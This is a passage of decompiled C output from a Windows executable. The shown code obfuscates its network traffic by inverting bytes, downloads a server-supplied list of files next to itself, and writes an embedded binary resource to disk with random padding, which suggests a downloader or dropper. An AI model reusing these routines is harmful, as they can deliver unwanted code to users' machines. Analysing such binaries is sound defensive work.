    if (local_10[iVar2] != (wchar_t *)0x0) {
      FUN_00409875(local_10[iVar2]);
    }
    iVar2 = iVar2 + 1;
  } while (iVar2 < 4);
  return (uint)lVar6 | (((int)lVar3 << 8 | (uint)lVar4) << 8 | (uint)lVar5) << 8;
}



int __cdecl FUN_004038b0(int param_1)

{
  wchar_t wVar1;
  wchar_t *in_EAX;
  wchar_t *pwVar2;
  int iVar3;
  size_t _Count;
  
  iVar3 = 0;
  pwVar2 = in_EAX;
  do {
    wVar1 = *pwVar2;
    pwVar2 = pwVar2 + 1;
  } while (wVar1 != L'\0');
  if ((int)pwVar2 - (int)(in_EAX + 1) >> 1 == 0) {
    return 0;
  }
  pwVar2 = _wcsstr(in_EAX,(wchar_t *)&DAT_004203bc);
  while (pwVar2 != (wchar_t *)0x0) {
    _Count = (int)pwVar2 - (int)in_EAX >> 1;
    if (0xf < (int)_Count) {
      _Count = 0xf;
    }
    _wcsncpy(*(wchar_t **)(param_1 + iVar3 * 4),in_EAX,_Count);
    in_EAX = pwVar2 + 1;
    *(undefined2 *)(*(int *)(param_1 + iVar3 * 4) + _Count * 2) = 0;
    iVar3 = iVar3 + 1;
    pwVar2 = _wcsstr(in_EAX,(wchar_t *)&DAT_004203bc);
  }
  _wcscpy_s(*(wchar_t **)(param_1 + iVar3 * 4),0xf,in_EAX);
  return iVar3 + 1;
}



undefined4 __cdecl FUN_00403950(undefined4 *param_1,undefined *param_2)

{
  LPVOID *ppvVar1;
  HANDLE pvVar2;
  LPVOID lpMem;
  int iVar3;
  LPVOID pvVar4;
  uint uVar5;
  undefined4 uVar6;
  DWORD DVar7;
  SIZE_T dwBytes;
  SIZE_T local_4;
  
  uVar5 = 0;
  local_4 = 15000;
  do {
    DVar7 = 0;
    dwBytes = local_4;
    pvVar2 = GetProcessHeap();
    lpMem = HeapAlloc(pvVar2,DVar7,dwBytes);
    if (lpMem == (LPVOID)0x0) {
      return 0xffffffff;
    }
    iVar3 = GetAdaptersAddresses(2,0x10,0,lpMem,&local_4);
    if (iVar3 == 0x6f) {
      DVar7 = 0;
      pvVar2 = GetProcessHeap();
      HeapFree(pvVar2,DVar7,lpMem);
      lpMem = (LPVOID)0x0;
    }
    uVar5 = uVar5 + 1;
    if (iVar3 != 0x6f) {
      if (iVar3 == 0) {
        pvVar4 = lpMem;
        if (lpMem != (LPVOID)0x0) goto LAB_004039e1;
        goto LAB_00403a3e;
      }
      break;
    }
  } while (uVar5 < 3);
  uVar6 = 0xfffffffd;
  goto LAB_004039b1;
  while (ppvVar1 = (LPVOID *)((int)pvVar4 + 8), pvVar4 = *ppvVar1, *ppvVar1 != (LPVOID)0x0) {
LAB_004039e1:
    if ((*(int *)((int)pvVar4 + 0x34) == 6) && (*(int *)((int)pvVar4 + 0x1c) != 0)) {
      *param_1 = *(undefined4 *)((int)pvVar4 + 0x2c);
      *(undefined2 *)(param_1 + 1) = *(undefined2 *)((int)pvVar4 + 0x30);
      param_2[3] = *(undefined *)(*(int *)(*(int *)((int)pvVar4 + 0x10) + 0xc) + 4);
      param_2[2] = *(undefined *)(*(int *)(*(int *)((int)pvVar4 + 0x10) + 0xc) + 5);
      param_2[1] = *(undefined *)(*(int *)(*(int *)((int)pvVar4 + 0x10) + 0xc) + 6);
      *param_2 = *(undefined *)(*(int *)(*(int *)((int)pvVar4 + 0x10) + 0xc) + 7);
LAB_00403a3e:
      uVar6 = 0;
      goto LAB_004039b1;
    }
  }
  uVar6 = 0;
LAB_004039b1:
  if (lpMem != (LPVOID)0x0) {
    DVar7 = 0;
    pvVar2 = GetProcessHeap();
    HeapFree(pvVar2,DVar7,lpMem);
  }
  return uVar6;
}



undefined4 FUN_00403a50(void)

{
  void *pvVar1;
  int iVar2;
  LPCSTR *ppCVar3;
  void *unaff_ESI;
  
  pvVar1 = operator_new(0x20);
  _memset(unaff_ESI,0,0xa0);
  iVar2 = FUN_00403950((undefined4 *)((int)unaff_ESI + 0x4a),
                       (undefined *)(undefined4 *)((int)unaff_ESI + 0x50));
  if (iVar2 == 0) {
    Ordinal_8(*(undefined4 *)((int)unaff_ESI + 0x50));
    ppCVar3 = (LPCSTR *)Ordinal_51(&stack0xfffffff8,4,2);
    if (ppCVar3 != (LPCSTR *)0x0) {
      FUN_00403ad0(*ppCVar3);
      if (pvVar1 != (void *)0x0) {
        FUN_00409875(pvVar1);
      }
      return 1;
    }
  }
  return 0;
}



LPWSTR __cdecl FUN_00403ad0(LPCSTR param_1)

{
  char cVar1;
  LPWSTR in_EAX;
  LPCSTR pCVar2;
  int iVar3;
  int iVar4;
  
  iVar4 = 0x20;
  pCVar2 = param_1;
  do {
    cVar1 = *pCVar2;
    pCVar2 = pCVar2 + 1;
  } while (cVar1 != '\0');
  iVar3 = (int)pCVar2 - (int)(param_1 + 1);
  if (in_EAX == (LPWSTR)0x0) {
    iVar4 = MultiByteToWideChar(0,0,param_1,-1,(LPWSTR)0x0,0);
    in_EAX = (LPWSTR)_malloc(iVar4 * 2);
  }
  if (iVar3 == 0) {
    *in_EAX = L'\0';
    return in_EAX;
  }
  if ((0 < iVar4) && (iVar4 + -1 < iVar3)) {
    iVar3 = iVar4 + -1;
  }
  MultiByteToWideChar(0,0,param_1,-1,in_EAX,iVar3 + 1);
  return in_EAX;
}



void __cdecl FUN_00403c10(uint param_1)

{
  char *unaff_ESI;
  char local_14;
  undefined4 local_13;
  undefined4 local_f;
  undefined4 local_b;
  undefined2 local_7;
  undefined local_5;
  uint local_4;
  
  local_4 = DAT_00422040 ^ (uint)&local_14;
  local_14 = '\0';
  local_13 = 0;
  local_f = 0;
  local_b = 0;
  local_7 = 0;
  local_5 = 0;
  FUN_00404eb0(param_1 >> 0x10 & 0xff,&local_14,s__d__d__d__d_004203d0);
  _strcpy_s(unaff_ESI,0x10,&local_14);
  ___security_check_cookie_4(local_4 ^ (uint)&local_14);
  return;
}



void FUN_00403c90(void)

{
  wchar_t *pwVar1;
  wchar_t *unaff_ESI;
  WCHAR local_20c [260];
  uint local_4;
  
  local_4 = DAT_00422040 ^ (uint)local_20c;
  GetModuleFileNameW((HMODULE)0x0,local_20c,0x104);
  pwVar1 = _wcsrchr(local_20c,L'\\');
  *pwVar1 = L'\0';
  _wcscpy_s(unaff_ESI,0x104,local_20c);
  ___security_check_cookie_4(local_4 ^ (uint)local_20c);
  return;
}



void FUN_00403cf0(void)

{
  int iVar1;
  int iVar2;
  undefined local_18;
  undefined4 local_17;
  undefined4 local_13;
  undefined4 local_f;
  undefined2 local_b;
  undefined local_9;
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)&local_18;
  local_18 = 0;
  local_17 = 0;
  local_13 = 0;
  local_f = 0;
  local_b = 0;
  local_9 = 0;
  iVar1 = FUN_00403da0();
  if ((((iVar1 != 0) && (iVar2 = FUN_00403da0(), iVar2 != 0)) && (iVar1 == 1)) && (iVar2 == 1)) {
    if (DAT_0042482e != 0) {
      FUN_00403c10(DAT_0042482e);
    }
    FUN_00403da0();
  }
  ___security_check_cookie_4(local_8 ^ (uint)&local_18);
  return;
}



void FUN_00403da0(void)

{
  int iVar1;
  undefined4 unaff_EBX;
  wchar_t *pwVar2;
  undefined4 unaff_EDI;
  wchar_t local_41c;
  undefined local_41a [518];
  wchar_t local_214;
  undefined local_212 [522];
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)&local_41c;
  iVar1 = FUN_00403ee0(unaff_EBX);
  if (iVar1 == 0) {
    local_41c = L'\0';
    _memset(local_41a,0,0x206);
    local_214 = L'\0';
    _memset(local_212,0,0x206);
    FUN_00403c90();
    _wcscat_s(&local_41c,0x104,(wchar_t *)&DAT_0042040c);
    pwVar2 = &DAT_004241b0;
    do {
      if (*pwVar2 != L'\0') {
        _wcscpy_s(&local_214,0x104,&local_41c);
        _wcscat_s(&local_214,0x104,pwVar2);
      }
      pwVar2 = pwVar2 + 0x8c;
    } while ((int)pwVar2 < 0x424728);
    pwVar2 = &DAT_004241b0;
    do {
      if (*pwVar2 != L'\0') {
        FUN_00404740(pwVar2,unaff_EDI,unaff_EBX);
      }
      pwVar2 = pwVar2 + 0x8c;
    } while ((int)pwVar2 < 0x424728);
    _wcscat_s(&local_41c,0x104,(wchar_t *)&DAT_00424da0);
    GetFileAttributesW(&local_41c);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&local_41c);
  return;
}



void __cdecl FUN_00403ee0(undefined4 param_1)

{
  wchar_t *_Src;
  void *_Dst;
  uint uVar1;
  int iVar2;
  ushort uVar3;
  undefined4 *puVar4;
  size_t sVar5;
  undefined4 *puVar6;
  undefined4 local_c18;
  uint local_c14;
  int local_c10;
  size_t local_c0c;
  undefined2 local_c08;
  undefined local_c06 [2046];
  undefined4 local_408 [257];
  uint local_4;
  
  local_4 = DAT_00422040 ^ (uint)&local_c18;
  local_c18 = 0;
  puVar4 = &DAT_00424ba0;
  puVar6 = local_408;
  for (iVar2 = 0x80; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar6 = *puVar4;
    puVar4 = puVar4 + 1;
    puVar6 = puVar6 + 1;
  }
  _Dst = _malloc(0x10000);
  _memset(_Dst,0,0x10000);
  local_c0c = 0x10000;
  local_c08 = 0;
  _memset(local_c06,0,0x7fe);
  local_c10 = 0;
  local_c14 = 0;
  iVar2 = FUN_004040f0(param_1,&local_c08);
  if (iVar2 == 0) {
    local_c18 = 1;
  }
  else {
    iVar2 = FUN_00404210((undefined2 *)local_408,&local_c10,0xbb9,0x200,&local_c08);
    if (iVar2 == 0) {
      local_c18 = 3;
    }
    else {
      if (_Dst == (void *)0x0) goto LAB_004040ba;
      iVar2 = FUN_004043f0(_Dst,&local_c10,(undefined2 *)&local_c14,&local_c0c,&local_c08);
      sVar5 = local_c0c;
      if (((iVar2 == 0) || ((short)local_c14 != 0xbb9)) || (local_c0c == 0)) {
        local_c18 = 2;
      }
      else {
        _memset(&DAT_004241b0,0,0x578);
        uVar3 = 0;
        local_c14 = 0;
        if (0x117 < (int)sVar5) {
          uVar1 = 0;
          do {
            _Src = (wchar_t *)(uVar1 + (int)_Dst);
            if ((*(short *)(uVar1 + (int)_Dst) != 0) && (uVar3 < 5)) {
              uVar1 = (uint)uVar3;
              _wcscpy_s(&DAT_004241b0 + uVar1 * 0x8c,0x7f,_Src);
              _memcpy_s(&DAT_004242b4 + uVar1 * 0x118,0x14,_Src + 0x82,0x14);
              (&DAT_004242b0)[uVar1 * 0x46] = *(undefined4 *)(_Src + 0x80);
              uVar3 = uVar3 + 1;
              sVar5 = local_c0c;
            }
            local_c14 = local_c14 + 0x118;
            uVar1 = local_c14 & 0xffff;
          } while ((int)(uVar1 + 0x118) <= (int)sVar5);
        }
      }
    }
  }
  if (_Dst != (void *)0x0) {
    _free(_Dst);
  }
LAB_004040ba:
  if (local_c10 != 0) {
    Ordinal_3(local_c10);
  }
  ___security_check_cookie_4(local_4 ^ (uint)&local_c18);
  return;
}



void __cdecl FUN_004040f0(undefined4 param_1,undefined2 *param_2)

{
  undefined2 uVar1;
  int iVar2;
  undefined2 *puVar3;
  int *unaff_ESI;
  undefined4 uStack_9bc;
  undefined4 uStack_9b8;
  undefined4 local_9b0 [5];
  undefined local_99c [400];
  undefined2 local_80c [1020];
  uint uStack_14;
  uint uStack_10;
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)local_9b0;
  puVar3 = local_80c;
  if (param_2 != (undefined2 *)0x0) {
    puVar3 = param_2;
  }
  *puVar3 = 0;
  uStack_9b8 = local_99c;
  uStack_9bc = 0x101;
  local_9b0[0] = 0;
  iVar2 = Ordinal_115();
  if (iVar2 != 0) {
LAB_00404138:
    uStack_9bc = 0x404149;
    ___security_check_cookie_4(uStack_10 ^ (uint)&uStack_9b8);
    return;
  }
  iVar2 = Ordinal_23(2,1);
  *unaff_ESI = iVar2;
  if (iVar2 == -1) goto LAB_00404138;
  iVar2 = Ordinal_52();
  if (iVar2 == 0) {
    Ordinal_11();
    iVar2 = Ordinal_51(&stack0xfffff640,4,2);
    if (iVar2 == 0) goto LAB_004041e5;
  }
  uStack_9b8 = (undefined *)CONCAT22(uStack_9b8._2_2_,2);
  uVar1 = Ordinal_9(local_8);
  uStack_9bc = CONCAT22(uVar1,(undefined2)uStack_9bc);
  iVar2 = Ordinal_4(*unaff_ESI,&uStack_9bc,0x10);
  if (iVar2 == 0) {
    ___security_check_cookie_4(uStack_14 ^ (uint)&uStack_9bc);
    return;
  }
LAB_004041e5:
  if (*unaff_ESI != 0) {
    Ordinal_3(*unaff_ESI);
    *unaff_ESI = 0;
  }
  ___security_check_cookie_4(uStack_14 ^ (uint)&uStack_9bc);
  return;
}



void __fastcall
FUN_00404210(undefined2 *param_1,int *param_2,undefined2 param_3,size_t param_4,undefined2 *param_5)

{
  undefined2 *puVar1;
  int iVar2;
  size_t _Size;
  size_t _Size_00;
  uint unaff_retaddr;
  undefined4 local_810;
  int *local_80c;
  undefined2 *local_808;
  undefined2 local_804 [1024];
  uint local_4;
  
  local_4 = DAT_00422040 ^ (uint)&local_810;
  puVar1 = local_804;
  if (param_5 != (undefined2 *)0x0) {
    puVar1 = param_5;
  }
  *puVar1 = 0;
  local_810 = 0;
  local_80c = param_2;
  local_808 = param_1;
  if (*param_2 != 0) {
    if (0xfffa < (int)param_4) {
      param_4 = 0xfffa;
    }
    puVar1 = (undefined2 *)operator_new(0x1000);
    _Size = param_4;
    if (0xffa < (int)param_4) {
      _Size = 0xffa;
    }
    *puVar1 = param_3;
    *(size_t *)(puVar1 + 1) = param_4;
    if ((param_1 == (undefined2 *)0x0) && (param_4 == 0)) {
      iVar2 = FUN_00404350(local_80c,puVar1);
      param_1 = puVar1;
      if (iVar2 != 0) {
        local_810 = 1;
      }
    }
    else {
      _memcpy(puVar1 + 3,param_1,_Size);
      iVar2 = FUN_00404350(local_80c,puVar1);
      param_1 = puVar1;
      if (iVar2 != 0) {
        for (; (int)_Size < (int)param_4; _Size = _Size + _Size_00) {
          _Size_00 = param_4 - _Size;
          if (0x1000 < (int)_Size_00) {
            _Size_00 = 0x1000;
          }
          _memcpy(puVar1,(void *)((int)local_808 + _Size),_Size_00);
          iVar2 = FUN_00404350(local_80c,puVar1);
          if (iVar2 == 0) goto LAB_00404325;
        }
        local_810 = 1;
      }
    }
  }
LAB_00404325:
  if (param_1 != (undefined2 *)0x0) {
    FUN_00409875(param_1);
  }
  local_810 = 0x404348;
  ___security_check_cookie_4(unaff_retaddr ^ (uint)&local_80c);
  return;
}



undefined4 __cdecl FUN_00404350(int *param_1,void *param_2)

{
  uint uVar1;
  int iVar2;
  int *piVar3;
  uint uVar4;
  size_t unaff_EDI;
  undefined4 local_4;
  
  iVar2 = 0;
  local_4 = 0;
  if (*param_1 != 0) {
    if (0 < (int)unaff_EDI) {
      do {
        *(byte *)(iVar2 + (int)param_2) = ~*(byte *)(iVar2 + (int)param_2);
        iVar2 = iVar2 + 1;
      } while (iVar2 < (int)unaff_EDI);
    }
    uVar1 = unaff_EDI + 7;
    piVar3 = (int *)operator_new(uVar1);
    *(short *)piVar3 = (short)unaff_EDI + 5;
    *(undefined4 *)((int)piVar3 + 2) = DAT_00423064;
    *(undefined *)((int)piVar3 + 6) = DAT_00423068;
    _memcpy((void *)((int)piVar3 + 7),param_2,unaff_EDI);
    uVar4 = Ordinal_19(*param_1,piVar3,uVar1,0);
    param_1 = piVar3;
    if ((uVar4 != 0xffffffff) && (uVar4 == uVar1)) {
      local_4 = 1;
    }
  }
  if (param_1 != (int *)0x0) {
    FUN_00409875(param_1);
  }
  return local_4;
}



void __fastcall
FUN_004043f0(void *param_1,int *param_2,undefined2 *param_3,size_t *param_4,undefined2 *param_5)

{
  size_t _Size;
  undefined2 *puVar1;
  undefined2 *_Src;
  int iVar2;
  undefined4 extraout_ECX;
  size_t sVar3;
  size_t sVar4;
  size_t sVar5;
  size_t sVar6;
  uint unaff_retaddr;
  size_t local_81c;
  void *local_818;
  undefined2 *local_814;
  undefined4 local_810;
  undefined2 *local_80c;
  int *local_808;
  undefined2 local_804;
  undefined local_802 [2046];
  uint local_4;
  
  local_4 = DAT_00422040 ^ (uint)&local_81c;
  local_814 = param_3;
  local_804 = 0;
  local_818 = param_1;
  local_808 = param_2;
  _memset(local_802,0,0x7fe);
  local_80c = &local_804;
  if (param_5 != (undefined2 *)0x0) {
    local_80c = param_5;
  }
  puVar1 = local_80c;
  *local_80c = 0;
  local_810 = 0;
  if ((*param_2 != 0) && (local_818 != (void *)0x0)) {
    local_81c = 0x1000;
    _Src = (undefined2 *)operator_new(0x1000);
    iVar2 = FUN_004045b0(extraout_ECX,_Src,local_808,&local_81c,puVar1);
    sVar4 = local_81c;
    if ((iVar2 != 0) && (sVar3 = local_81c - 6, -1 < (int)sVar3)) {
      *local_814 = *_Src;
      local_814 = *(undefined2 **)(_Src + 1);
      sVar4 = *param_4;
      if ((int)sVar4 < (int)sVar3) {
        sVar6 = 0;
        if (0 < (int)sVar4) {
          _memcpy(local_818,_Src + 3,sVar4);
          sVar6 = *param_4;
        }
      }
      else {
        _memcpy(local_818,_Src + 3,sVar3);
        sVar6 = sVar3;
      }
      sVar5 = sVar6;
      if ((int)sVar3 < (int)local_814) {
        do {
          local_81c = 0x1000;
          iVar2 = FUN_004045b0(local_808,_Src,local_808,&local_81c,local_80c);
          _Size = local_81c;
          sVar4 = local_81c;
          if ((iVar2 == 0) || (sVar4 = sVar3 + local_81c, 0x10000 < (int)sVar4)) goto LAB_00404582;
          sVar3 = *param_4;
          sVar6 = sVar5 + local_81c;
          local_81c = sVar4;
          if ((int)sVar3 < (int)sVar6) {
            sVar6 = sVar5;
            if ((int)sVar5 < (int)sVar3) {
              _memcpy((void *)((int)local_818 + sVar5),_Src,sVar3 - sVar5);
              sVar6 = *param_4;
            }
          }
          else {
            _memcpy((void *)((int)local_818 + sVar5),_Src,_Size);
          }
          sVar3 = local_81c;
          sVar5 = sVar6;
        } while ((int)local_81c < (int)local_814);
      }
      *param_4 = sVar6;
      local_810 = 1;
      sVar4 = local_81c;
    }
LAB_00404582:
    local_81c = sVar4;
    if (_Src != (undefined2 *)0x0) {
      FUN_00409875(_Src);
    }
  }
  local_81c = 0x4045a5;
  ___security_check_cookie_4(unaff_retaddr ^ (uint)&local_818);
  return;
}



void __fastcall
FUN_004045b0(undefined4 param_1,void *param_2,int *param_3,size_t *param_4,undefined2 *param_5)

{
  size_t *psVar1;
  int iVar2;
  int *piVar3;
  int iVar4;
  byte *pbVar5;
  undefined2 *puVar6;
  size_t _Size;
  uint uVar7;
  size_t sVar8;
  undefined4 local_8d8;
  void *local_8d4;
  size_t *local_8d0;
  undefined2 local_8cc;
  undefined2 local_804 [1024];
  uint local_4;
  
  local_4 = DAT_00422040 ^ (uint)&local_8d8;
  local_8d0 = param_4;
  puVar6 = local_804;
  if (param_5 != (undefined2 *)0x0) {
    puVar6 = param_5;
  }
  *puVar6 = 0;
  iVar2 = *param_3;
  local_8d8 = 0;
  local_8d4 = param_2;
  if ((iVar2 != 0) && (param_2 != (void *)0x0)) {
    local_8cc = local_8cc & 0xff00;
    _memset((void *)((int)&local_8cc + 1),0,199);
    iVar2 = Ordinal_16(iVar2,&local_8cc,2,0);
    if ((iVar2 == -1) || (iVar2 == 0)) {
      ___security_check_cookie_4(local_4 ^ (uint)&local_8d8);
      return;
    }
    uVar7 = (uint)local_8cc;
    iVar2 = 0;
    piVar3 = (int *)operator_new(uVar7 + 2);
    if (uVar7 != 0) {
      do {
        iVar4 = Ordinal_16(*param_3,iVar2 + (int)piVar3,uVar7 - iVar2,0);
        psVar1 = local_8d0;
        if ((iVar4 == -1) || (iVar4 == 0)) {
          Ordinal_111();
          goto LAB_004046fb;
        }
        iVar2 = iVar2 + iVar4;
      } while (iVar2 < (int)uVar7);
      if (((4 < iVar2) && (_Size = iVar2 - 5, DAT_00423064 == *piVar3)) &&
         (*(char *)(piVar3 + 1) == DAT_00423068)) {
        if (0 < (int)_Size) {
          pbVar5 = (byte *)((int)piVar3 + 5);
          sVar8 = _Size;
          do {
            *pbVar5 = ~*pbVar5;
            pbVar5 = pbVar5 + 1;
            sVar8 = sVar8 - 1;
          } while (sVar8 != 0);
        }
        if ((int)*local_8d0 < (int)_Size) {
          _memcpy(local_8d4,(void *)((int)piVar3 + 5),*local_8d0);
        }
        else {
          _memcpy(local_8d4,(void *)((int)piVar3 + 5),_Size);
          *psVar1 = _Size;
        }
        local_8d8 = 1;
      }
    }
LAB_004046fb:
    if (piVar3 != (int *)0x0) {
      FUN_00409875(piVar3);
    }
  }
  ___security_check_cookie_4(local_4 ^ (uint)&local_8d8);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

void __cdecl FUN_00404740(wchar_t *param_1,undefined4 param_2,undefined4 param_3)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  char *_Dst;
  wchar_t *pwVar3;
  int iVar4;
  undefined4 *puVar5;
  undefined4 *puVar6;
  undefined auStack_1030 [4];
  FILE *local_102c;
  int local_1028;
  undefined4 local_1024;
  size_t local_1020;
  undefined4 local_101c;
  wchar_t local_1018;
  undefined local_1016 [518];
  WCHAR local_e10 [260];
  wchar_t local_c08;
  undefined4 local_c06 [255];
  undefined2 local_808;
  undefined local_806 [2050];
  uint local_4;
  
  local_4 = DAT_00422040 ^ (uint)auStack_1030;
  local_101c = param_2;
  _memset(&local_c08,0,0x400);
  _wcscpy_s(&local_c08,0x1ff,param_1);
  pwVar2 = param_1;
  do {
    wVar1 = *pwVar2;
    pwVar2 = pwVar2 + 1;
  } while (wVar1 != L'\0');
  puVar5 = &DAT_00424ba0;
  puVar6 = (undefined4 *)((int)local_c06 + ((int)pwVar2 - (int)(param_1 + 1) >> 1) * 2);
  for (iVar4 = 0x80; iVar4 != 0; iVar4 = iVar4 + -1) {
    *puVar6 = *puVar5;
    puVar5 = puVar5 + 1;
    puVar6 = puVar6 + 1;
  }
  pwVar2 = param_1 + 1;
  do {
    wVar1 = *param_1;
    param_1 = param_1 + 1;
  } while (wVar1 != L'\0');
  _Dst = (char *)_malloc(0x10000);
  _memset(_Dst,0,0x10000);
  local_1020 = 0x10000;
  local_808 = 0;
  _memset(local_806,0,0x7fe);
  local_1028 = 0;
  local_102c = (FILE *)0x0;
  local_1024 = 0;
  local_1018 = L'\0';
  _memset(local_1016,0,0x206);
  GetModuleFileNameW((HMODULE)0x0,local_e10,0x104);
  pwVar3 = _wcsrchr(local_e10,L'\\');
  *pwVar3 = L'\0';
  _wcscpy_s(&local_1018,0x104,local_e10);
  _wcscat_s(&local_1018,0x103,(wchar_t *)&DAT_00420410);
  iVar4 = FUN_004040f0(param_3,&local_808);
  if (iVar4 != 0) {
    iVar4 = FUN_00404210(&local_c08,&local_1028,0xbba,((int)param_1 - (int)pwVar2 >> 1) * 2 + 0x202,
                         &local_808);
    if (iVar4 != 0) {
      iVar4 = FUN_004043f0(_Dst,&local_1028,(undefined2 *)&local_1024,&local_1020,&local_808);
      if ((((iVar4 != 0) && ((short)local_1024 == 0xbba)) && (local_1020 != 0)) && (*_Dst == '\0'))
      {
        _wcscat_s(&local_1018,0x104,(wchar_t *)&DAT_00424da0);
        local_102c = (FILE *)0x0;
        __wfopen_s(&local_102c,&local_1018,(wchar_t *)&DAT_00420414);
        if (local_102c != (FILE *)0x0) {
          FUN_004049c0(&local_102c);
        }
        local_102c = (FILE *)0x1;
      }
    }
  }
  if (_Dst != (char *)0x0) {
    _free(_Dst);
  }
  if (local_1028 != 0) {
    Ordinal_3(local_1028);
  }
  ___security_check_cookie_4(local_4 ^ (uint)auStack_1030);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

void __cdecl FUN_004049c0(undefined4 param_1)

{
  int iVar1;
  size_t _Count;
  uint uVar2;
  undefined4 *unaff_EDI;
  uint uStack_101c;
  FILE **ppFStack_1018;
  undefined local_100c [4];
  undefined4 local_1008;
  uint uStack_14;
  uint local_4;
  
  local_4 = DAT_00422040 ^ (uint)local_100c;
  uVar2 = 0;
  ppFStack_1018 = (FILE **)0x0;
  uStack_101c = 4;
  local_1008 = param_1;
  iVar1 = Ordinal_16(*unaff_EDI,local_100c);
  if (iVar1 != 4) {
    ___security_check_cookie_4(uStack_14 ^ (uint)&uStack_101c);
    return;
  }
  if (uStack_101c != 0) {
    do {
      _Count = Ordinal_16(*unaff_EDI,&stack0xffffefec,0x1000,0);
      if (_Count == 0) break;
      _fwrite(&stack0xffffefec,1,_Count,*ppFStack_1018);
      uVar2 = uVar2 + _Count;
    } while (uVar2 < uStack_101c);
  }
  _fclose(*ppFStack_1018);
  ___security_check_cookie_4(uStack_14 ^ (uint)&uStack_101c);
  return;
}



void * __cdecl FUN_00404a90(DWORD *param_1)

{
  HMODULE hModule;
  HRSRC hResInfo;
  DWORD _Size;
  HGLOBAL hResData;
  LPVOID _Src;
  void *_Dst;
  
  hModule = GetModuleHandleW((LPCWSTR)0x0);
  hResInfo = FindResourceW(hModule,(LPCWSTR)0x84,u_IDR_BINARY_0041e07c);
  if (hResInfo != (HRSRC)0x0) {
    _Size = SizeofResource(hModule,hResInfo);
    hResData = LoadResource(hModule,hResInfo);
    _Src = LockResource(hResData);
    *param_1 = _Size;
    _Dst = operator_new(_Size);
    _memset(_Dst,0,_Size);
    _memcpy(_Dst,_Src,_Size);
    FreeResource(hResData);
    return _Dst;
  }
  return (void *)0x0;
}



undefined8 __cdecl FUN_00404b10(LPCWSTR param_1,undefined4 param_2)

{
  void *pvVar1;
  int in_EAX;
  DWORD DVar2;
  void *lpBuffer;
  int iVar3;
  HANDLE hFile;
  BOOL BVar4;
  uint uVar5;
  undefined4 extraout_ECX;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  uint extraout_EDX_01;
  undefined8 uVar6;
  ulonglong uVar7;
  void *pvStack_8;
  uint uStack_4;
  
  DVar2 = GetFileAttributesW(param_1);
  if (DVar2 != 0xffffffff) {
    uVar6 = FUN_00404c20();
    if ((int)uVar6 == in_EAX) {
      return CONCAT44((int)((ulonglong)uVar6 >> 0x20),1);
    }
  }
  lpBuffer = _malloc(0x200000);
  pvStack_8 = (void *)0x200000;
  iVar3 = FUN_00404c80(in_EAX,&pvStack_8,param_2,lpBuffer);
  if (iVar3 != 0) {
    DVar2 = GetTickCount();
    FUN_004097e0(DVar2);
    uStack_4 = _rand();
    uVar7 = FUN_00417090(extraout_ECX,extraout_EDX);
    pvVar1 = pvStack_8;
    FUN_00403380();
    DVar2 = (int)uVar7 + (int)pvVar1;
    hFile = FUN_00404e00();
    if (hFile != (HANDLE)0xffffffff) {
      BVar4 = WriteFile(hFile,lpBuffer,DVar2,&uStack_4,(LPOVERLAPPED)0x0);
      uVar5 = -(uint)(BVar4 != 0) & uStack_4;
      CloseHandle(hFile);
      if (uVar5 == DVar2) {
        _free(lpBuffer);
        return CONCAT44(extraout_EDX_00,1);
      }
    }
  }
  _free(lpBuffer);
  return (ulonglong)extraout_EDX_01 << 0x20;
}



undefined8 FUN_00404c20(void)

{
  LPCWSTR in_EAX;
  HANDLE hFile;
  BOOL BVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  LARGE_INTEGER LStack_c;
  
  hFile = CreateFileW(in_EAX,0x80000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (hFile == (HANDLE)0xffffffff) {
    return 0xffffffffffffffff;
  }
  BVar1 = GetFileSizeEx(hFile,&LStack_c);
  uVar2 = -1;
  uVar3 = 0xffffffff;
  if (BVar1 == 1) {
    uVar2 = LStack_c.s.HighPart;
    uVar3 = LStack_c.s.LowPart;
  }
  CloseHandle(hFile);
  return CONCAT44(uVar2,uVar3);
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_00404c80(undefined4 param_1,void **param_2,undefined4 param_3,void *param_4)

{
  int *piVar1;
  int iVar2;
  int *piVar3;
  undefined4 uStack_244;
  void **local_240;
  int local_23c;
  undefined2 local_238;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  void *local_10;
  uint local_8;
  uint uStack_4;
  
  local_8 = DAT_00422040 ^ (uint)&uStack_244;
  local_240 = param_2;
  piVar3 = FUN_00408f30(param_3,param_1);
  if (piVar3 != (int *)0x0) {
    if (*piVar3 == 1) {
      piVar1 = (int *)piVar3[1];
      if (*(uint *)(*piVar1 + 4) < 0x80000000) {
        if (piVar1[1] != -1) {
          FUN_00408590();
          param_2 = local_240;
        }
        piVar1[1] = -1;
        local_30 = 0;
        local_2c = 0;
        local_28 = 0;
        local_24 = 0;
        local_20 = 0;
        local_1c = 0;
        local_18 = 0;
        local_14 = 0;
        _DAT_00424fa8 = 0;
      }
      else {
        _DAT_00424fa8 = 0x10000;
      }
    }
    else {
      _DAT_00424fa8 = 0x80000;
    }
    local_23c = 0;
    local_238 = 0;
    local_10 = (void *)0x0;
    if (*piVar3 == 1) {
      _DAT_00424fa8 = FUN_004087b0((void *)piVar3[1],0,&local_23c);
    }
    else {
      _DAT_00424fa8 = 0x80000;
    }
    if (*piVar3 == 1) {
      _DAT_00424fa8 = FUN_00408d70(param_4,*param_2);
    }
    else {
      _DAT_00424fa8 = 0x80000;
    }
    *param_2 = local_10;
    if (*piVar3 == 1) {
      iVar2 = piVar3[1];
      _DAT_00424fa8 = FUN_00408ed0();
      if (iVar2 != 0) {
        FUN_00408fe0();
      }
      FUN_00409875(piVar3);
    }
    else {
      _DAT_00424fa8 = 0x80000;
    }
  }
  uStack_244 = 0x404dea;
  ___security_check_cookie_4(uStack_4 ^ (uint)&local_240);
  return;
}



HANDLE FUN_00404e00(void)

{
